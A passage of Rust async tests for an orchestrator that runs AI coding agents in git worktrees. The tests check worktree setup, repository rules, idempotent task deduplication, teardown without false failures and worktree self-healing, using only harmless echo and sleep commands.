            if let Some(path) = t.workspace.worktree_path.as_deref() {
                let _ = std::fs::remove_dir_all(path);
            }
        }
    }

    #[tokio::test]
    async fn start_task_creates_worktree_and_transitions_through_running_to_completed() {
        let (orchestrator, repositories, _pool, tmp) = fresh_orchestrator().await;

        // Build a real git repo so the worktree create works.
        let repo_dir = tmp.path().join("repo");
        std::fs::create_dir_all(&repo_dir).unwrap();
        init_repo(&repo_dir);

        let mut repo = Repository::new(
            "test".into(),
            Some(repo_dir.to_string_lossy().into_owned()),
            None,
        );
        repo.default_branch = "main".into();
        repositories.insert(&repo).await.unwrap();

        let mut status_rx = orchestrator.subscribe_status();

        let started = orchestrator
            .start_task_and_wait(StartTaskRequest {
                repository_id: repo.id.clone(),
                user_id: None,
                agent: Agent::Claude,
                // A quick-exiting command so the exit watcher fires
                // deterministically regardless of which agents are
                // installed on the machine running the test.
                command: "echo hello-phasr; exit".into(),
                name: "test task".into(),
                prompt: None,
                base_branch: None,
                rows: None,
                cols: None,
                permission_mode: None,
                notify_on_attention: true,
                run_in: RunIn::Worktree,
            })
            .await
            .expect("start_task should succeed");

        assert_eq!(started.workspace.status, WorkspaceStatus::Running);
        assert!(started
            .workspace
            .branch
            .as_deref()
            .unwrap()
            .starts_with("phasr/"));
        let worktree_path = started.workspace.worktree_path.as_ref().unwrap();
        assert!(Path::new(worktree_path).join("README.md").exists());

        // Pending as soon as the row exists, then Running once the
        // background setup spawned the agent.
        let first = tokio::time::timeout(Duration::from_secs(2), status_rx.recv())
            .await
            .expect("status event")
            .expect("recv ok");
        assert_eq!(first.status, WorkspaceStatus::Pending);
        let second = tokio::time::timeout(Duration::from_secs(2), status_rx.recv())
            .await
            .expect("status event")
            .expect("recv ok");
        assert_eq!(second.status, WorkspaceStatus::Running);

        // Wait for the PTY's `exit; ` to fire — flip should be
        // Completed (code 0).
        let mut saw_completion = None;
        let deadline = tokio::time::Instant::now() + Duration::from_secs(15);
        while tokio::time::Instant::now() < deadline {
            match tokio::time::timeout(Duration::from_millis(200), status_rx.recv()).await {
                Ok(Ok(event))
                    if matches!(
                        event.status,
                        WorkspaceStatus::Completed | WorkspaceStatus::Failed
                    ) =>
                {
                    saw_completion = Some(event);
                    break;
                }
                _ => continue,
            }
        }
        let completion = saw_completion.expect("expected a terminal status event");
        assert_eq!(completion.task_id, started.task_id);
        // Some shells synthesise non-zero exits even on a clean
        // `exit; ` — accept either Completed or Failed as long as we
        // got *a* terminal event. The transition itself is what's
        // under test.
        assert!(matches!(
            completion.status,
            WorkspaceStatus::Completed | WorkspaceStatus::Failed
        ));
    }

    // Task #12: server-side idempotency. A concurrent/rapid duplicate
    // start_task for the SAME (repository_id, name) must NOT create a
    // second worktree/branch/agent — it returns the EXISTING task. Fire
    // two starts concurrently against one repo (the double-fire the guard
    // defends against), then a third back-to-back, and assert every call
    // resolves to the same task_id with exactly one worktree + one
    // `phasr/*` branch created.
    /// M11: settings + repository rules drive the worktree a task gets —
    /// branch template, worktree base, default base branch, copied
    /// untracked files (never overwriting) and the after-create hook, whose
    /// output lands in the task log before the agent spawns.
    #[tokio::test]
    async fn start_task_applies_repository_rules_before_spawning() {
        let (orchestrator, repositories, pool, tmp) = fresh_orchestrator().await;
        let repo = repo_with_git(&repositories, &tmp, "rules-repo").await;
        let repo_path = PathBuf::from(repo.local_path.clone().unwrap());
        // A `develop` base with a marker file, and an ignored `.env` in the
        // checkout to copy; README.md is tracked (must not be overwritten).
        Command::new("git")
            .args(["checkout", "-qb", "develop"])
            .current_dir(&repo_path)
            .status()
            .unwrap();
        std::fs::write(repo_path.join("DEVELOP"), "d").unwrap();
        std::fs::write(repo_path.join(".gitignore"), ".env\n").unwrap();
        Command::new("git")
            .args(["add", "-A"])
            .current_dir(&repo_path)
            .status()
            .unwrap();
        Command::new("git")
            .args(["commit", "-qm", "develop"])
            .current_dir(&repo_path)
            .status()
            .unwrap();
        Command::new("git")
            .args(["checkout", "-q", "main"])
            .current_dir(&repo_path)
            .status()
            .unwrap();
        std::fs::write(repo_path.join(".env"), "TOKEN=1\n").unwrap();
        std::fs::write(repo_path.join("README.md"), "edited in checkout").unwrap();

        let configs = crate::store::RepositoryConfigRepo::new(pool.clone());
        let mut cfg = configs.get(&repo.id).await.unwrap();
        let base = tmp.path().join("custom-wt");
        cfg.worktree_base_path = Some(base.to_string_lossy().into_owned());
        cfg.branch_prefix_template = Some("team/{{agent}}/{{slug}}".into());
        cfg.default_base_branch = Some("develop".into());
        cfg.copy_untracked_globs = vec![".env".into(), "README.md".into()];
        cfg.pre_task_hook = Some("echo hook-ran > HOOK && echo from-the-hook".into());
        configs.upsert(&cfg, None).await.unwrap();
        let orchestrator = orchestrator.with_task_config(TaskConfig::new(
            configs,
            crate::store::SettingsRepo::new(pool.clone()),
            None,
        ));

        let started = orchestrator
            .start_task_and_wait(sleep_request(&repo.id, "Add login page"))
            .await
            .unwrap();
        let ws = &started.workspace;
        let worktree = PathBuf::from(ws.worktree_path.clone().unwrap());
        assert_eq!(
            worktree,
            base.join(&ws.id),
            "under the repository's worktree base"
        );
        assert_eq!(ws.branch.as_deref(), Some("team/claude/add-login-page"));
        assert_eq!(ws.base_branch.as_deref(), Some("develop"));
        assert!(worktree.join("DEVELOP").exists(), "cut from develop");
        assert_eq!(
            std::fs::read_to_string(worktree.join(".env")).unwrap(),
            "TOKEN=1\n"
        );
        assert_eq!(
            std::fs::read_to_string(worktree.join("README.md")).unwrap(),
            "hi",
            "never overwritten"
        );
        assert_eq!(
            std::fs::read_to_string(worktree.join("HOOK"))
                .unwrap()
                .trim(),
            "hook-ran"
        );
        let log = orchestrator.read_task_log(&ws.id).await.unwrap();
        assert!(log.contains("from-the-hook"), "{log}");
        assert!(log.contains("copied into the worktree: .env"), "{log}");

        cleanup(&orchestrator, &[&started]).await;
    }

    #[tokio::test]
    async fn duplicate_start_task_is_idempotent() {
        let (orchestrator, repositories, _pool, tmp) = fresh_orchestrator().await;
        let repo_dir = tmp.path().join("repo");
        std::fs::create_dir_all(&repo_dir).unwrap();
        init_repo(&repo_dir);
        let mut repo = Repository::new(
            "test".into(),
            Some(repo_dir.to_string_lossy().into_owned()),
            None,
        );
        repo.default_branch = "main".into();
        repositories.insert(&repo).await.unwrap();

        // A long-lived command keeps the agent `running` for the whole
        // test, so later duplicates deterministically observe an ACTIVE
        // task regardless of PTY scheduling.
        let request = StartTaskRequest {
            repository_id: repo.id.clone(),
            user_id: None,
            agent: Agent::Claude,
            command: "sleep 30".into(),
            name: "add-feature".into(),
            prompt: None,
            base_branch: None,
            rows: None,
            cols: None,
            permission_mode: None,
            notify_on_attention: true,
            run_in: RunIn::Worktree,
        };

        // Fire both concurrently. The per-repo lock serializes them: one
        // creates, the other blocks, then finds the freshly-inserted row
        // and returns it — no second worktree/branch/agent.
        let other = orchestrator.clone();
        let (first_res, second_res) = tokio::join!(
            orchestrator.start_task_and_wait(request.clone()),
            other.start_task_and_wait(request.clone()),
        );
        let first = first_res.expect("first start_task should succeed");
        let second = second_res.expect("second start_task should succeed");

        assert_eq!(
            first.task_id, second.task_id,
            "a duplicate start_task must return the existing task_id"
        );
        assert_eq!(
            count_worktrees(&repo_dir),
            2,
            "duplicate start_task must not create a second worktree (main + one task)"
        );
        assert_eq!(
            count_phasr_branches(&repo_dir),
            1,
            "duplicate start_task must not create a second branch"
        );

        // A duplicate arriving AFTER the first, back-to-back, is caught by
        // the same active-task guard.
        let third = orchestrator
            .start_task_and_wait(request.clone())
            .await
            .expect("back-to-back duplicate should succeed");
        assert_eq!(third.task_id, first.task_id);
        assert_eq!(count_worktrees(&repo_dir), 2);
        assert_eq!(count_phasr_branches(&repo_dir), 1);

        // Kill the PTY (a single task_id thanks to dedup) and drop its
        // worktree dir so the `sleep` doesn't linger — the worktree lives
        // under $HOME/.phasr, outside the test's TempDir.
        cleanup(&orchestrator, &[&first]).await;
    }

    // A same-named DRAFT must not hijack start_task (it would return the
    // never-launched row instead of starting anything), and start_task
    // records the base branch it cut the worktree from.
    #[tokio::test]
    async fn start_task_ignores_a_same_named_draft_and_records_its_base() {
        let (orchestrator, repositories, _pool, tmp) = fresh_orchestrator().await;
        let repo = repo_with_git(&repositories, &tmp, "repo").await;
        let draft = orchestrator
            .create_row(
                TaskRow {
                    repository_id: repo.id.clone(),
                    agent: Agent::Claude,
                    command: "sleep 30".into(),
                    name: "add-feature".into(),
                    prompt: None,
                    base_branch: None,
                    permission_mode: None,
                    notify_on_attention: true,
                    queued: false,
                    depends_on: None,
                },
                None,
            )
            .await
            .unwrap();
        let started = orchestrator
            .start_task_and_wait(sleep_request(&repo.id, "add-feature"))
            .await
            .unwrap();
        assert_ne!(
            started.task_id, draft.id,
            "the draft was returned instead of a new task"
        );
        assert_eq!(started.workspace.status, WorkspaceStatus::Running);
        assert_eq!(started.workspace.base_branch.as_deref(), Some("main"));
        // The draft has no worktree: opening its terminal must not run the
        // agent in the repository's own checkout.
        assert!(matches!(
            orchestrator.open_terminal(&draft.id, 24, 80).await,
            Err(OrchestratorError::NotStarted)
        ));
        cleanup(&orchestrator, &[&started]).await;
    }

    // --- Dedup correctness: distinct requests must stay distinct ---

    // Case 1: same repo, DIFFERENT names → two distinct tasks. The guard
    // must not over-dedup on repository alone.
    #[tokio::test]
    async fn distinct_names_same_repo_create_distinct_tasks() {
        let (orchestrator, repositories, _pool, tmp) = fresh_orchestrator().await;
        let repo = repo_with_git(&repositories, &tmp, "repo").await;
        let repo_path = Path::new(repo.local_path.as_deref().unwrap());

        let a = orchestrator
            .start_task_and_wait(sleep_request(&repo.id, "add-feature"))
            .await
            .unwrap();
        let b = orchestrator
            .start_task_and_wait(sleep_request(&repo.id, "fix-bug"))
            .await
            .unwrap();

        assert_ne!(a.task_id, b.task_id, "different names must not be deduped");
        assert_eq!(
            count_worktrees(repo_path),
            3,
            "main checkout + two distinct task worktrees"
        );
        assert_eq!(count_phasr_branches(repo_path), 2);

        cleanup(&orchestrator, &[&a, &b]).await;
    }

    // Case 2: SAME name, DIFFERENT repos → two distinct tasks. The dedup key
    // is repo-scoped.
    #[tokio::test]
    async fn same_name_distinct_repos_create_distinct_tasks() {
        let (orchestrator, repositories, _pool, tmp) = fresh_orchestrator().await;
        let repo1 = repo_with_git(&repositories, &tmp, "repo1").await;
        let repo2 = repo_with_git(&repositories, &tmp, "repo2").await;

        let a = orchestrator
            .start_task_and_wait(sleep_request(&repo1.id, "add-feature"))
            .await
            .unwrap();
        let b = orchestrator
            .start_task_and_wait(sleep_request(&repo2.id, "add-feature"))
            .await
            .unwrap();

        assert_ne!(
            a.task_id, b.task_id,
            "same name in different repos must not be deduped"
        );
        assert_eq!(
            count_worktrees(Path::new(repo1.local_path.as_deref().unwrap())),
            2
        );
        assert_eq!(
            count_worktrees(Path::new(repo2.local_path.as_deref().unwrap())),
            2
        );

        cleanup(&orchestrator, &[&a, &b]).await;
    }

    // Case 3: N-way concurrency (8 parallel identical starts on a multi-thread
    // runtime) → EXACTLY one worktree/branch, all calls return the same
    // task_id. This is the real double-fire, amplified.
    #[tokio::test(flavor = "multi_thread", worker_threads = 4)]
    async fn n_way_concurrent_duplicates_create_exactly_one_task() {
        let (orchestrator, repositories, _pool, tmp) = fresh_orchestrator().await;
        let repo = repo_with_git(&repositories, &tmp, "repo").await;
        let repo_path_str = repo.local_path.clone().unwrap();

        let mut handles = Vec::new();
        for _ in 0..8 {
            let o = orchestrator.clone();
            let req = sleep_request(&repo.id, "add-feature");
            handles.push(tokio::spawn(async move { o.start_task_and_wait(req).await }));
        }
        let mut started = Vec::new();
        for h in handles {
            started.push(
                h.await
                    .unwrap()
                    .expect("each concurrent start_task must succeed"),
            );
        }

        let ids: Vec<&str> = started.iter().map(|s| s.task_id.as_str()).collect();
        assert!(
            ids.windows(2).all(|w| w[0] == w[1]),
            "all concurrent duplicates must resolve to one task_id, got {ids:?}"
        );
        let repo_path = Path::new(&repo_path_str);
        assert_eq!(
            count_worktrees(repo_path),
            2,
            "exactly one task worktree despite the N-way race"
        );
        assert_eq!(count_phasr_branches(repo_path), 1);

        cleanup(&orchestrator, &[&started[0]]).await;
    }

    // --- Active-bounding: a re-run must work once the first is no longer active ---

    // Case 4: after the first reaches each TERMINAL/non-active status
    // (stopped, completed, failed, archived), a re-run of the same
    // (repo, name) creates a NEW task — it is NOT deduped to the dead one.
    #[tokio::test]
    async fn rerun_after_non_active_status_creates_new_task() {
        let (orchestrator, repositories, pool, tmp) = fresh_orchestrator().await;
        let repo = repo_with_git(&repositories, &tmp, "repo").await;
        let workspaces = WorkspaceRepo::new(pool.clone());

        let mut created: Vec<StartedTask> = Vec::new();
        for status in [
            WorkspaceStatus::Stopped,
            WorkspaceStatus::Completed,
            WorkspaceStatus::Failed,
            WorkspaceStatus::Archived,
        ] {
            // Distinct name per status so the sub-cases don't interfere.
            let name = format!("task-{}", status.as_str());
            // Seed a matching agent row already in the terminal status.
            // `insert` does not validate transitions, so we set it directly.
            let mut dead = Workspace::new(repo.id.clone(), name.clone(), "cmd".into());
            dead.status = status;
            workspaces.insert(&dead).await.unwrap();

            let started = orchestrator
                .start_task_and_wait(sleep_request(&repo.id, &name))
                .await
                .unwrap_or_else(|e| {
                    panic!(
                        "re-run after `{}` should create a task: {e}",
                        status.as_str()
                    )
                });
            assert_ne!(
                started.task_id,
                dead.id,
                "re-run after `{}` must not dedup to the inactive task",
                status.as_str()
            );
            assert_eq!(started.workspace.status, WorkspaceStatus::Running);
            assert!(
                started
                    .workspace
                    .worktree_path
                    .as_deref()
                    .map(|p| Path::new(p).exists())
                    .unwrap_or(false),
                "the re-run must build a fresh worktree"
            );
            created.push(started);
        }

        let refs: Vec<&StartedTask> = created.iter().collect();
        cleanup(&orchestrator, &refs).await;
    }

    // Case 5: after the first is SOFT-DELETED (deleted_at set), a re-run of
    // the same (repo, name) creates a NEW task.
    #[tokio::test]
    async fn rerun_after_soft_delete_creates_new_task() {
        let (orchestrator, repositories, pool, tmp) = fresh_orchestrator().await;
        let repo = repo_with_git(&repositories, &tmp, "repo").await;
        let workspaces = WorkspaceRepo::new(pool.clone());

        // A running agent task, then tombstoned.
        let mut ghost = Workspace::new(repo.id.clone(), "add-feature".into(), "cmd".into());
        ghost.status = WorkspaceStatus::Running;
        workspaces.insert(&ghost).await.unwrap();
        workspaces.delete(&ghost.id).await.unwrap();

        let started = orchestrator
            .start_task_and_wait(sleep_request(&repo.id, "add-feature"))
            .await
            .unwrap();
        assert_ne!(
            started.task_id, ghost.id,
            "a soft-deleted task must not be deduped against"
        );
        assert_eq!(started.workspace.status, WorkspaceStatus::Running);

        cleanup(&orchestrator, &[&started]).await;
    }

    // Case 6: PENDING is active. A duplicate arriving while the first row is
    // still `pending` (the exact state a start_task is in before it flips to
    // running) is deduped — and the dedup path creates NO worktree/branch.
    #[tokio::test]
    async fn pending_task_is_treated_as_active_and_deduped() {
        let (orchestrator, repositories, pool, tmp) = fresh_orchestrator().await;
        let repo = repo_with_git(&repositories, &tmp, "repo").await;
        let workspaces = WorkspaceRepo::new(pool.clone());
        let repo_path = Path::new(repo.local_path.as_deref().unwrap());

        // The row a start in flight has written: pending, branch already
        // cut (start_task inserts after the worktree). Without a branch it
        // would be a draft, which must NOT dedup (see
        // `start_task_ignores_a_same_named_draft_and_records_its_base`).
        let mut pending = Workspace::new(repo.id.clone(), "add-feature".into(), "cmd".into());
        pending.branch = Some("phasr/add-feature-inflight".into());
        assert_eq!(pending.status, WorkspaceStatus::Pending);
        workspaces.insert(&pending).await.unwrap();

        let started = orchestrator
            .start_task_and_wait(sleep_request(&repo.id, "add-feature"))
            .await
            .unwrap();
        assert_eq!(
            started.task_id, pending.id,
            "a duplicate while the first is pending must return the existing task"
        );
        assert_eq!(
            count_worktrees(repo_path),
            1,
            "the dedup path creates no worktree (only the main checkout)"
        );
        assert_eq!(count_phasr_branches(repo_path), 0);
        // Nothing was spawned by the deduped call — no cleanup needed.
    }

    // --- Scoping refinements ---

    // Case 7: a LOCAL workspace named X (even a RUNNING one) must never be
    // treated as a duplicate agent task — the guard is `workspace_kind='agent'`
    // scoped. A second agent start then dedups to the AGENT task, not the local.
    #[tokio::test]
    async fn agent_start_task_ignores_a_local_workspace_of_the_same_name() {
        let (orchestrator, repositories, pool, tmp) = fresh_orchestrator().await;
        let repo = repo_with_git(&repositories, &tmp, "repo").await;
        let workspaces = WorkspaceRepo::new(pool.clone());
        let repo_path = Path::new(repo.local_path.as_deref().unwrap());

        // The ever-present local workspace, forced RUNNING so only the KIND
        // filter (not status) can keep it out of the dedup lookup.
        let mut local = Workspace::new(repo.id.clone(), "add-feature".into(), String::new());
        local.workspace_kind = WorkspaceKind::Local;
        local.status = WorkspaceStatus::Running;
        workspaces.insert(&local).await.unwrap();

        let agent = orchestrator
            .start_task_and_wait(sleep_request(&repo.id, "add-feature"))
            .await
            .unwrap();
        assert_ne!(
            agent.task_id, local.id,
            "agent start_task must not dedup against the local workspace"
        );
        assert_eq!(agent.workspace.workspace_kind, WorkspaceKind::Agent);
        assert_eq!(
            count_worktrees(repo_path),
            2,
            "the new agent task got its own worktree"
        );

        // A second agent start with the same name dedups to the AGENT task.
        let agent2 = orchestrator
            .start_task_and_wait(sleep_request(&repo.id, "add-feature"))
            .await
            .unwrap();
        assert_eq!(agent2.task_id, agent.task_id);
        assert_eq!(count_worktrees(repo_path), 2, "still one agent worktree");
        assert_eq!(count_phasr_branches(repo_path), 1);

        cleanup(&orchestrator, &[&agent]).await;
    }

    // --- Name / input semantics (decisions documented in-line) ---

    // Case 9: name dedup is a RAW, exact-string match (SQLite BINARY
    // collation) — no case-folding, no trimming. This is deliberate and
    // consistent with the frontend: NewTaskForm trims the name (and requires
    // it non-empty) before invoking start_task, so a genuine double-fire
    // always sends byte-identical names, while legitimately-different names
    // ("fix" vs "Fix") remain distinct tasks.
    #[tokio::test]
    async fn name_dedup_is_exact_match_case_and_whitespace_sensitive() {
        let (orchestrator, repositories, _pool, tmp) = fresh_orchestrator().await;
        let repo = repo_with_git(&repositories, &tmp, "repo").await;

        let lower = orchestrator
            .start_task_and_wait(sleep_request(&repo.id, "fix"))
            .await
            .unwrap();
        let upper = orchestrator
            .start_task_and_wait(sleep_request(&repo.id, "Fix"))
            .await
            .unwrap();
        let trailing = orchestrator
            .start_task_and_wait(sleep_request(&repo.id, "fix "))
            .await
            .unwrap();

        assert_ne!(
            lower.task_id, upper.task_id,
            "case differences must not be folded"
        );
        assert_ne!(
            lower.task_id, trailing.task_id,
            "trailing whitespace is significant"
        );
        assert_ne!(upper.task_id, trailing.task_id);

        cleanup(&orchestrator, &[&lower, &upper, &trailing]).await;
    }

    // Case 10: empty / whitespace-only names. NewTaskForm requires a non-empty
    // trimmed name, so these shouldn't reach the backend in practice — but they
    // must not crash, and two empty-name requests must dedup (idempotent),
    // never spawn duplicates. `""` and `" "` are DIFFERENT exact strings.
    #[tokio::test]
    async fn empty_and_whitespace_names_are_handled_defensively() {
        let (orchestrator, repositories, _pool, tmp) = fresh_orchestrator().await;
        let repo = repo_with_git(&repositories, &tmp, "repo").await;

        let empty1 = orchestrator
            .start_task_and_wait(sleep_request(&repo.id, ""))
            .await
            .expect("an empty name must not crash");
        let empty2 = orchestrator
            .start_task_and_wait(sleep_request(&repo.id, ""))
            .await
            .unwrap();
        assert_eq!(
            empty1.task_id, empty2.task_id,
            "two empty-name requests must dedup to one task"
        );
        // Empty slug falls back to a `phasr/<id>` branch — no crash / no
        // empty branch name.
        assert!(empty1
            .workspace
            .branch
            .as_deref()
            .unwrap()
            .starts_with("phasr/"));

        let space = orchestrator
            .start_task_and_wait(sleep_request(&repo.id, " "))
            .await
            .unwrap();
        assert_ne!(
            space.task_id, empty1.task_id,
            "a single-space name is a different exact string from empty"
        );

        cleanup(&orchestrator, &[&empty1, &space]).await;
    }

    // Case 11: the dedup key is (repository_id, name) ONLY — base_branch,
    // agent, and prompt are intentionally ignored, because a genuine
    // double-fire carries identical fields. KNOWN LIMITATION: a user wanting
    // two same-named tasks off different base branches within the active
    // window is blocked (vary the name, or wait for the first to finish);
    // the frontend never produces this from a single form submission.
    #[tokio::test]
    async fn duplicate_with_different_base_agent_prompt_still_dedups() {
        let (orchestrator, repositories, _pool, tmp) = fresh_orchestrator().await;
        let repo = repo_with_git(&repositories, &tmp, "repo").await;
        let repo_path = Path::new(repo.local_path.as_deref().unwrap());

        let first = orchestrator
            .start_task_and_wait(sleep_request(&repo.id, "add-feature"))
            .await
            .unwrap();

        // Same name, but a different agent, a (non-existent) base branch, and
        // a prompt. The base branch is never resolved because dedup returns
        // before any worktree work — proving those fields aren't in the key.
        let mut variant = sleep_request(&repo.id, "add-feature");
        variant.agent = Agent::Codex;
        variant.base_branch = Some("some-other-base".into());
        variant.prompt = Some("a totally different prompt".into());
        let second = orchestrator.start_task_and_wait(variant).await.unwrap();

        assert_eq!(
            second.task_id, first.task_id,
            "differing base/agent/prompt must still dedup on (repo, name)"
        );
        // The first task wins — the duplicate returns the existing row.
        assert_eq!(second.workspace.agent, Some(Agent::Claude));
        assert_eq!(count_worktrees(repo_path), 2, "no second worktree");
        assert_eq!(count_phasr_branches(repo_path), 1);

        cleanup(&orchestrator, &[&first]).await;
    }

    // Regression: workspaces created via the orchestrator must carry the
    // signed-in user_id, otherwise cloud sync (which filters dirty rows by
    // user_id) never pushes them and they stay invisible in Supabase.
    #[tokio::test]
    async fn start_task_stamps_user_id_for_sync() {
        let (orchestrator, repositories, pool, tmp) = fresh_orchestrator().await;
        let repo_dir = tmp.path().join("repo");
        std::fs::create_dir_all(&repo_dir).unwrap();
        init_repo(&repo_dir);
        let mut repo = Repository::new(
            "test".into(),
            Some(repo_dir.to_string_lossy().into_owned()),
            None,
        );
        repo.default_branch = "main".into();

        // workspaces.user_id has a FK to users(id), so seed a user row.
        sqlx::query(
            "INSERT INTO users (id, clerk_user_id, name, email, created_at, updated_at, dirty)
             VALUES ('user-x', 'user-x', 'X', 'x@example.com', '2026-01-01T00:00:00Z', '2026-01-01T00:00:00Z', 0)",
        )
        .execute(&pool)
        .await
        .unwrap();
        // Owned by the same account, as in production (create_repository
        // stamps the owner; sign-in adopts legacy unowned rows) — a
        // session-scoped start_task can only see its own repositories.
        repositories.insert_for_user(&repo, "user-x").await.unwrap();

        let started = orchestrator
            .start_task_and_wait(StartTaskRequest {
                repository_id: repo.id.clone(),
                user_id: Some("user-x".into()),
                agent: Agent::Claude,
                command: "echo hi; exit".into(),
                name: "owned task".into(),
                prompt: None,
                base_branch: None,
                rows: None,
                cols: None,
                permission_mode: None,
                notify_on_attention: true,
                run_in: RunIn::Worktree,
            })
            .await
            .expect("start_task should succeed");

        let user_id: Option<String> =
            sqlx::query_scalar("SELECT user_id FROM workspaces WHERE id = ?")
                .bind(&started.workspace.id)
                .fetch_one(&pool)
                .await
                .unwrap();
        assert_eq!(user_id.as_deref(), Some("user-x"));

        // And it must be dirty so the sync worker picks it up.
        let dirty: i64 = sqlx::query_scalar("SELECT dirty FROM workspaces WHERE id = ?")
            .bind(&started.workspace.id)
            .fetch_one(&pool)
            .await
            .unwrap();
        assert_eq!(dirty, 1);
    }

    #[tokio::test]
    async fn start_task_rejects_repository_without_local_path() {
        let (orchestrator, repositories, _pool, _tmp) = fresh_orchestrator().await;
        let repo = Repository::new("no-path".into(), None, None);
        repositories.insert(&repo).await.unwrap();
        let err = orchestrator
            .start_task_and_wait(StartTaskRequest {
                repository_id: repo.id,
                user_id: None,
                agent: Agent::Claude,
                command: Agent::Claude.command().into(),
                name: "t".into(),
                prompt: None,
                base_branch: None,
                rows: None,
                cols: None,
                permission_mode: None,
                notify_on_attention: true,
                run_in: RunIn::Worktree,
            })
            .await
            .unwrap_err();
        assert!(matches!(err, OrchestratorError::RepositoryHasNoLocalPath));
    }

    #[tokio::test]
    async fn stop_task_errors_when_task_not_running() {
        let (orchestrator, _r, _pool, _t) = fresh_orchestrator().await;
        let err = orchestrator.stop_task("missing").await.unwrap_err();
        assert!(matches!(err, OrchestratorError::TaskNotRunning(_)));
    }

    /// Regression: archiving or deleting a workspace with a live agent
    /// used to kill the PTY while the row was still `running`. The exit
    /// watcher then saw a non-zero exit (SIGKILL) and broadcast
    /// `failed`, which surfaced as "the agent exited with an error" for
    /// a workspace the user had just removed. `quiesce_task` must move
    /// the row out of `running` FIRST so the watcher stays silent.
    #[tokio::test]
    async fn quiesce_task_kills_without_reporting_a_failure() {
        let (orchestrator, repositories, _pool, tmp) = fresh_orchestrator().await;
        let repo_dir = tmp.path().join("repo");
        std::fs::create_dir_all(&repo_dir).unwrap();
        init_repo(&repo_dir);
        let mut repo = Repository::new(
            "test".into(),
            Some(repo_dir.to_string_lossy().into_owned()),
            None,
        );
        repo.default_branch = "main".into();
        repositories.insert(&repo).await.unwrap();

        let mut status_rx = orchestrator.subscribe_status();

        let started = orchestrator
            .start_task_and_wait(StartTaskRequest {
                repository_id: repo.id.clone(),
                user_id: None,
                agent: Agent::Claude,
                // Long-running, so the process is still alive when we
                // tear it down — the situation the bug needed.
                command: "sleep 120".into(),
                name: "doomed task".into(),
                prompt: None,
                base_branch: None,
                rows: None,
                cols: None,
                permission_mode: None,
                notify_on_attention: true,
                run_in: RunIn::Worktree,
            })
            .await
            .expect("start_task should succeed");
        let task_id = started.workspace.id.clone();

        for expected in [WorkspaceStatus::Pending, WorkspaceStatus::Running] {
            let event = tokio::time::timeout(Duration::from_secs(2), status_rx.recv())
                .await
                .expect("status event")
                .expect("recv ok");
            assert_eq!(event.status, expected);
        }

        orchestrator.quiesce_task(&task_id).await;

        // Give the exit watcher every chance to misbehave.
        let deadline = tokio::time::Instant::now() + Duration::from_secs(5);
        while tokio::time::Instant::now() < deadline {
            match tokio::time::timeout(Duration::from_millis(200), status_rx.recv()).await {
                Ok(Ok(event)) => panic!(
                    "teardown must not broadcast a status event, got {:?} (exit {:?})",
                    event.status, event.exit_code
                ),
                Ok(Err(_)) => break,
                Err(_) => continue,
            }
        }

        // And the row records a deliberate stop, not a failure.
        let row = orchestrator.workspaces.get(&task_id).await.unwrap();
        assert_eq!(row.status, WorkspaceStatus::Stopped);
        assert!(row.finished_at.is_some());
    }

    // F1: opening a workspace whose worktree dir is gone (moved repo,
    // cleaned temp dir, synced from another machine) must self-heal by
    // recreating the worktree from the branch — not fail to start.
    #[tokio::test]
    async fn cwd_for_task_recreates_a_missing_worktree() {
        let (orchestrator, repositories, _pool, tmp) = fresh_orchestrator().await;
        let repo_dir = tmp.path().join("repo");
        std::fs::create_dir_all(&repo_dir).unwrap();
        init_repo(&repo_dir);
        let mut repo = Repository::new(
            "test".into(),
            Some(repo_dir.to_string_lossy().into_owned()),
            None,
        );
        repo.default_branch = "main".into();
        repositories.insert(&repo).await.unwrap();

        // Points at a worktree dir that doesn't exist, but records a branch
        // we can re-attach.
        let worktree_path = tmp.path().join("gone-worktree");
        assert!(!worktree_path.exists());
        let mut workspace = Workspace::new(repo.id.clone(), "restore me".into(), "echo".into());
        workspace.branch = Some("phasr/restore".into());
        workspace.worktree_path = Some(worktree_path.to_string_lossy().into_owned());

        let cwd = orchestrator
            .cwd_for_task(&workspace)
            .await
            .expect("self-heal should recreate the missing worktree");
        assert_eq!(cwd, worktree_path);
        assert!(
            worktree_path.join("README.md").exists(),
            "recreated worktree should carry the repo's tracked files"
        );
    }

    /// A discarded task (outcome closed, worktree removed) must not come
    /// back from the dead when its terminal is reopened.
    #[tokio::test]
    async fn cwd_for_task_does_not_recreate_a_closed_tasks_worktree() {
        let (orchestrator, repositories, _pool, tmp) = fresh_orchestrator().await;
        let repo_dir = tmp.path().join("repo");
        std::fs::create_dir_all(&repo_dir).unwrap();
        init_repo(&repo_dir);
        let mut repo = Repository::new(
            "test".into(),
            Some(repo_dir.to_string_lossy().into_owned()),
            None,
        );
        repo.default_branch = "main".into();
        repositories.insert(&repo).await.unwrap();
        let worktree_path = tmp.path().join("discarded");
        let mut workspace = Workspace::new(repo.id.clone(), "discarded".into(), "echo".into());
        workspace.branch = Some("phasr/discarded".into());
        workspace.worktree_path = Some(worktree_path.to_string_lossy().into_owned());
        workspace.outcome = Some(crate::domain::TaskOutcome::Closed);
        assert!(matches!(
            orchestrator.cwd_for_task(&workspace).await,
            Err(OrchestratorError::WorktreeUnavailable)
        ));
        assert!(!worktree_path.exists());
    }

    // The calm path: a missing worktree with no branch to recreate from
    // returns WorktreeUnavailable, not a hard RepositoryPathMissing.
    #[tokio::test]
    async fn cwd_for_task_returns_calm_error_when_it_cannot_recreate() {
        let (orchestrator, repositories, _pool, tmp) = fresh_orchestrator().await;
        let repo_dir = tmp.path().join("repo");
        std::fs::create_dir_all(&repo_dir).unwrap();
        init_repo(&repo_dir);
        let mut repo = Repository::new(
            "test".into(),
            Some(repo_dir.to_string_lossy().into_owned()),
            None,
        );
        repo.default_branch = "main".into();
        repositories.insert(&repo).await.unwrap();

        let mut workspace = Workspace::new(repo.id.clone(), "no branch".into(), "echo".into());
        workspace.branch = None;
        workspace.worktree_path = Some(tmp.path().join("gone").to_string_lossy().into_owned());

        let err = orchestrator.cwd_for_task(&workspace).await.unwrap_err();
        assert!(matches!(err, OrchestratorError::WorktreeUnavailable));
    }

    async fn seed_user(pool: &crate::store::Db, id: &str) {
        sqlx::query(
            "INSERT INTO users (id, clerk_user_id, name, email, created_at, updated_at, dirty)
             VALUES (?, ?, 'n', ?, '2026-01-01T00:00:00Z', '2026-01-01T00:00:00Z', 0)",
        )
        .bind(id)
        .bind(id)
        .bind(format!("{id}@example.com"))
        .execute(pool)
        .await
        .unwrap();
    }

    /// The gate in front of stop/send-input/interrupt/resize/open/read-log:
    /// a second local account presenting the first account's task id gets
    /// `not found` — and a cached approval for the owner never leaks to
